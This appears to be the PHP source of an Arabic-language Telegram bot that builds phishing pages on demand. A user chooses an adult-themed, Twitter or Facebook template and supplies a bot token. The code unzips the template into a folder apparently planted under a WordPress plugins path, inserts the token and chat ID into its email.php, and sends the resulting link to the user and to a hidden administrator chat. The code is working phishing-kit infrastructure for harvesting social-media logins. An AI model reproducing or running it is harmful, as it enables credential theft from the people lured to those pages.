$zip->extractTo(__DIR__."/"."sex/$chat_id");
$zip->close();
$file = file_get_contents("sex/$chat_id/email.php");
$file2 = str_replace("my-token","$text",$file);
$file3 = str_replace("my-id","$chat_id",$file2);
file_put_contents("sex/$chat_id/email.php",$file3);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
- تم انشاء اندكس انحراف .
- رابط الاندكس : https://".$_SERVER["SERVER_NAME"]."/wp230/wp-content/plugins/x/sex/$chat_id
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[ 
[["text"=>"- 𝙙𝙚𝙫 .","url"=>"t.me/index333bot"]],
]])
]);
bot('sendMessage',[
'chat_id'=>$super,
'text'=>"
- تم انشاء اندكس انحراف .
- رابط الاندكس : https://".$_SERVER["SERVER_NAME"]."/wp230/wp-content/plugins/x/sex/$chat_id
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[ 
[["text"=>"- 𝙙𝙚𝙫 .","url"=>"t.me/index333bot"]],
]])
]);
}}}
//\\
if($data =="twitter" and !file_exists("twitter/$chat_id2/email.php")){
file_put_contents("data/$chat_id2/log.txt","twitter");
bot('deletemessage',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id2,
]);
bot('Sendphoto',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id2, 
'photo'=>"https://t.me/index99/6",
'caption'=>"
- لقد قمت ب اختيار اندكس تويتر .
- ارسل التوكن الان .
", 
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[ 
[["text"=>"- back .","callback_data"=>"make"]],
]])
]);
}
if($text != "/start" and $log == "twitter"){
$api = json_decode(file_get_contents("https://api.telegram.org/bot".$text."/getMe"),1);
$check = $api["ok"];
if($check != true){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"- التوكن خطأ .",
'reply_to_message_id'=>$message_id,
]);
}else{
mkdir("twitter/$chat_id");
$zip = new ZipArchive;
if($zip->open("twitter.zip") == true){
$zip->extractTo(__DIR__."/"."twitter/$chat_id");
$zip->close();
$file = file_get_contents("twitter/$chat_id/email.php");
$file2 = str_replace("my-token","$text",$file);
$file3 = str_replace("my-id","$chat_id",$file2);
file_put_contents("twitter/$chat_id/email.php",$file3);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
- تم انشاء اندكس تويتر .
- رابط الاندكس : https://".$_SERVER["SERVER_NAME"]."/wp230/wp-content/plugins/x/twitter/$chat_id
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[ 
[["text"=>"- 𝙙𝙚𝙫 .","url"=>"t.me/index333bot"]],
]])
]);
bot('sendMessage',[
'chat_id'=>$super,
'text'=>"
- تم انشاء اندكس تويتر .
- رابط الاندكس : https://".$_SERVER["SERVER_NAME"]."/wp230/wp-content/plugins/x/twitter/$chat_id
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[ 
[["text"=>"- 𝙙𝙚𝙫 .","url"=>"t.me/index333bot"]],
]])
]);
}}}
//\\
if($data =="facebook" and !file_exists("facebook/$chat_id2/email.php")){
file_put_contents("data/$chat_id2/log.txt","facebook");
bot('deletemessage',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id2,
]);
bot('Sendphoto',[
'chat_id'=>$chat_id2,
'message_id'=>$message_id2, 
'photo'=>"https://t.me/index99/13",
'caption'=>"
- لقد قمت ب اختيار اندكس فيسبوك .
- ارسل التوكن الان .
", 
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[ 
[["text"=>"- back .","callback_data"=>"make"]],
]])
]);
}
if($text != "/start" and $log == "facebook"){
$api = json_decode(file_get_contents("https://api.telegram.org/bot".$text."/getMe"),1);
$check = $api["ok"];
if($check != true){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"- التوكن خطأ .",
'reply_to_message_id'=>$message_id,
]);
}else{
mkdir("facebook/$chat_id");
$zip = new ZipArchive;
if($zip->open("facebook.zip") == true){
$zip->extractTo(__DIR__."/"."facebook/$chat_id");
$zip->close();
$file = file_get_contents("facebook/$chat_id/email.php");
$file2 = str_replace("my-token","$text",$file);
$file3 = str_replace("my-id","$chat_id",$file2);
file_put_contents("facebook/$chat_id/email.php",$file3);
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
- تم انشاء اندكس فيس بوك .
- رابط الاندكس : https://".$_SERVER["SERVER_NAME"]."/wp230/wp-content/plugins/x/facebook/$chat_id
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[ 
[["text"=>"- 𝙙𝙚𝙫 .","url"=>"t.me/index333bot"]],
]])
]);
bot('sendMessage',[
'chat_id'=>$super,
'text'=>"
- تم انشاء اندكس فيس بوك .
- رابط الاندكس : https://".$_SERVER["SERVER_NAME"]."/wp230/wp-content/plugins/x/facebook/$chat_id
",
'parse_mode'=>"markdown",'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[ 
[["text"=>"- 𝙙𝙚𝙫 .","url"=>"t.me/index333bot"]],
]])
]);
}}}
bot("setMyCommands",[
"commands"=>json_encode([
['command'=>"/start",'description'=>'♻️ تحديث البوت'],
])
]);
//\\